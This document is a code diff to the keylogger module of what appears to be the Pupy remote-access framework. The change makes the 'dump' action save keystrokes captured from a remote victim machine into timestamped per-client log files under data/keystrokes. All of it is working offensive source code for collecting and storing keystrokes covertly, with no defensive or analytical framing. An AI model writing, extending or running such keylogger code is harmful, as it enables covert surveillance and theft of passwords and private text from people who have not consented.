@@ -8,6 +8,8 @@ import logging
 import struct
 import traceback
 import time
+import os
+import datetime
 from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
@@ -37,11 +39,21 @@ class KeyloggerModule(PupyModule):
 				else:
 					self.success("keylogger started !")
 		elif args.action=="dump":
-			self.success("dumping recorded keystrokes :")
+			try:
+				os.makedirs(os.path.join("data","keystrokes"))
+			except Exception:
+				pass
+			
 			data=self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
 			if data is None:
 				self.error("keylogger not started")
+			elif not data:
+				self.warning("no keystrokes recorded")
 			else:
+				filepath=os.path.join("data", "keystrokes","keys_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".log")
+				self.success("dumping recorded keystrokes in %s"%filepath)
+				with open(filepath, 'w') as f:
+					f.write(data)
 				self.log(data)
 
 		elif args.action=="stop":
